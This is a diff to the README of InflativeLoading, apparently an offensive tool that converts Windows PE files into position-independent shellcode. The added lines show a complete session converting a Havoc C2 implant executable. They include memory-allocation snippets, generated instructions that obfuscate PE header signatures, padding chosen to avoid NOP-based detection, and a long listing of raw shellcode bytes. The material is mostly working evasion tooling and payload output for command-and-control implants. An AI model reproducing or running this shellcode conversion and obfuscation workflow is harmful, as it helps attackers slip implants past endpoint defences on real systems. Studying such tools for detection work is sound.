@@ -11,12 +11,116 @@ After all the processes are completed, even these bytes will be overwritten for 
 
 ![image](/screenshot/header_obfuscation.jpg)
 
-**However, depending on the selected program, obfuscation may not be compatible with it. For example, Havoc stateless DLL payload is not compatible with the obfuscation feature because the DLL also makes use of the PE header**
+**However, depending on the selected program, obfuscation may not be compatible with it. You should know how does the program work. For example, Havoc stateless DLL payload is not compatible with the obfuscation feature because the DLL also makes use of the PE header.**
 
 ![image](/screenshot/havocdll.jpg)
 
+Havoc stageless EXE payload works well with obfuscation:
+
+```powershell
+PS C:\Users\Administrator\Desktop\dev\inflativeloading> .\DumpPEFromMemory.exe .\havoc.exe havoc.bin
+[+] The file is an EXE file
+[+] Process PID: 26772
+[+] PEB Address:000000E87CB1D000
+[+] Image Base Address:00007FF7BB8A0000
+[+] e_lfanew is 0x80
+[+] Size Of The Image : 0x1e000
+[+] Size Of Optional Header : 0xf0
+[+] Size Of text Section : 0x18000
+[+] Size of other sections of mapped .\havoc.exe is 0x5000
+
+[!] Suggested memory allocations, please adjust accordingly with other memory allocation APIs and languages
+
+// Allocate memory with RX permission for shellcode stub
+LPVOID buffer = VirtualAlloc(NULL, 0x1000, 0x3000, 0x20);
+// Allocate memory with RW permission for PE Header
+VirtualAlloc(buffer + 0x1000, 0x1000, 0x3000, 0x04);
+// Allocate memory with RX permission for text section
+VirtualAlloc(buffer + 0x2000, 0x18000, 0x3000, 0x20);
+// Allocate memory with RW permission for other sections
+VirtualAlloc(buffer + 0x2000 + 0x18000, 0x5000, 0x3000, 0x20);
+
+[+] 3 iterations are needed
+
+[+] Data successfully written to havoc.bin. Total bytes read: 0x1e000
+PS C:\Users\Administrator\Desktop\dev\inflativeloading> python .\InflativeLoading.py -f .\havoc.bin -e true -o true -b havocsc.bin
+
+██╗███╗   ██╗███████╗██╗      █████╗ ████████╗██╗██╗   ██╗███████╗
+██║████╗  ██║██╔════╝██║     ██╔══██╗╚══██╔══╝██║██║   ██║██╔════╝
+██║██╔██╗ ██║█████╗  ██║     ███████║   ██║   ██║██║   ██║█████╗
+██║██║╚██╗██║██╔══╝  ██║     ██╔══██║   ██║   ██║╚██╗ ██╔╝██╔══╝
+██║██║ ╚████║██║     ███████╗██║  ██║   ██║   ██║ ╚████╔╝ ███████╗
+╚═╝╚═╝  ╚═══╝╚═╝     ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝  ╚══════╝
+
+    ██╗      ██████╗  █████╗ ██████╗ ██╗███╗   ██╗ ██████╗
+    ██║     ██╔═══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝
+    ██║     ██║   ██║███████║██║  ██║██║██╔██╗ ██║██║  ███╗
+    ██║     ██║   ██║██╔══██║██║  ██║██║██║╚██╗██║██║   ██║
+    ███████╗╚██████╔╝██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝
+    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝
+
+Author: Senzee
+Github Repository: https://github.com/senzee1984/InflativeLoading
+Twitter: senzee@1984
+Website: https://winslow1984.com
+Description: Dynamically convert a native PE to PIC shellcode
+Attention: Bugs are expected, more support and improvements are coming!
+
+
+
+[!] The offset to NT header is 0x80
+[!] Depending on the program, obfuscation may not be compatible with it. Make sure you know how does the program work!
+[!] Dynamically generated instructions to obfuscate remained PE signatures:
+    mov dword ptr [rbx+0x3c], 0x29f7945;
+    mov dword ptr [rbx+0xa8], 0x99924859;
+    mov dword ptr [rbx+0xb0], 0x99924859;
+    mov dword ptr [rbx+0xb4], 0x1203885a;
+    mov dword ptr [rbx+0xd0], 0xbc488d5f;
+    mov dword ptr [rbx+0x110], 0xbc488d5f;
+    mov dword ptr [rbx+0x114], 0x87287f91;
+    mov dword ptr [rbx+0x130], 0xbc488d5f;
+    mov dword ptr [rbx+0x134], 0xd44cc6bb;
+    mov dword ptr [rbx+0x170], 0xbc488d5f;
+    mov dword ptr [rbx+0x174], 0x8d976bd1;
+
+[+] Shellcode Stub size: 957 bytes
+[+] Generating NOP-like instructions to pad shellcode stub up to 0x1000 bytes
+[!] Shellcoded PE's size: 126976 bytes
+
+
+buf += b"\x48\x83\xe4\xf0\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x20\x48\x83\xc6\x70"
+buf += b"\xc6\x06\x0c\xc6\x46\x02\xff\x48\x8b\x76\x08\xc7\x06\x31\x00\x2e\x00\xc7\x46\x04"
+buf += b"\x65\x00\x78\x00\xc7\x46\x08\x65\x00\x20\x00\xc6\x46\x0c\x00\x48\x8b\x70\x18\x48"
+buf += b"\x8b\x76\x30\x4c\x8b\x0e\x4d\x8b\x09\x4d\x8b\x49\x10\xeb\x66\x41\x8b\x49\x3c\x4d"
+buf += b"\x31\xff\x41\xb7\x88\x4d\x01\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f"
+buf += b"\x18\x45\x8b\x77\x20\x4d\x01\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c"
+buf += b"\x01\xce\x48\x31\xc0\x48\x31\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb"
+buf += b"\xf4\x44\x39\xc2\x75\xda\x45\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b"
+buf += b"\x5f\x1c\x4d\x01\xcb\x41\x8b\x04\x8b\x4c\x01\xc8\xc3\x48\x31\xc0\xc3\x4c\x89\xcd"
+buf += b"\x41\xb8\x8e\x4e\x0e\xec\xe8\x8c\xff\xff\xff\x49\x89\xc4\x41\xb8\xaa\xfc\x0d\x7c"
+buf += b"\xe8\x7e\xff\xff\xff\x49\x89\xc5\xeb\x0a\x48\x31\xc0\x8b\x43\x3c\x48\x01\xd8\xc3"
+buf += b"\x48\x31\xf6\x48\x31\xff\x48\x8d\x1d\x17\x0f\x00\x00\xe8\xe4\xff\xff\xff\x8b\xb0"
+buf += b"\x90\x00\x00\x00\x48\x01\xde\x8b\xb8\x94\x00\x00\x00\x48\x01\xf7\x48\x39\xfe\x74"
+buf += b"\x74\x48\x31\xd2\x8b\x56\x10\x48\x85\xd2\x74\x69\x48\x31\xc9\x8b\x4e\x0c\x48\x01"
+buf += b"\xd9\x41\xff\xd4\x48\x31\xd2\x8b\x56\x10\x48\x01\xda\x48\x89\xc1\x49\x89\xd6\x4c"
+buf += b"\x89\xf2\x48\x8b\x12\x48\x85\xd2\x74\x3d\x49\xb9\x00\x00\x00\x00\x00\x00\x00\x80"
+buf += b"\x4c\x85\xca\x48\x89\xcd\x75\x0c\x48\x01\xda\x48\x83\xc2\x02\x41\xff\xd5\xeb\x10"
+buf += b"\x49\xb9\xff\xff\xff\xff\xff\xff\xff\x7f\x4c\x21\xca\x41\xff\xd5\x48\x89\xe9\x4c"
+buf += b"\x89\xf2\x48\x89\x02\x49\x83\xc6\x08\xeb\xb8\x48\x83\xc6\x14\xeb\x87\x48\x31\xf6"
+buf += b"\x48\x31\xff\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xff\xe8\x45\xff\xff\xff\x8b\xb0\xb0"
+......126576 more bytes......
+
+
+Generated shellcode successfully saved in file havocsc.bin
+
+
+[#] Shellcode located at address 0x1ae8ab70000
+
+[!] PRESS TO EXECUTE SHELLCODED EXE...
+```
+
 ### 4/11/2024 Replace padded NOP with NOP-Like instruction sequences
-Before the update, 0x90/NOP instructions are padded after the actual shellcode stub to align a memory page. Many NOPs could be a detection, therefore, InflativeLoading script dynamically selects preset NOP-Like instruction sequences. User can also add new ones or replace existing ones to achieve better obfuscation.
+Before the update, `0x90/NOP` instructions are padded after the actual shellcode stub to align a memory page. Many NOPs could be a detection, therefore, InflativeLoading script dynamically selects preset NOP-Like instruction sequences. Users can also add new ones or replace existing ones to achieve better obfuscation.
 
 ```python
     nop_like_instructions = [
@@ -56,7 +160,7 @@ VirtualAlloc(buffer + 0x2000, 0x1000, 0x3000, 0x20);
 // Allocate memory with RW permission for other sections
 VirtualAlloc(buffer + 0x2000 + 0x1000, 0x5000, 0x3000, 0x20);
 ```
-The shellcode stub is fixed as 0x1000 bytes, PE header is fixed at 0x1000 bytes, the size of text section and other sections varies.
+The shellcode stub is fixed at 0x1000 bytes, the PE header is fixed at 0x1000 bytes, and the size of the text section and other sections varies.
 
 
 ### 4/11/2024 Added Support For Unmanaged DLL
